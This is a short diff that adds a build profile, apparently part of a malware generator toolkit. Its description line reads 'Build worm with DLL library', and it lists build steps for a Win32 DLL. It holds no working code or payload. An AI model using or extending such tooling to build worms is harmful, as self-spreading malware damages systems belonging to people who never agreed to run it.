@@ -1,0 +1,8 @@
+#!name##ExeLib
+#!types##process
+#!info##Build worm with DLL library
+
+[BASE]
+[SAVE_RAW]
+[BUILD_DLL_LIBRARY]
+[BUILD_WIN32]
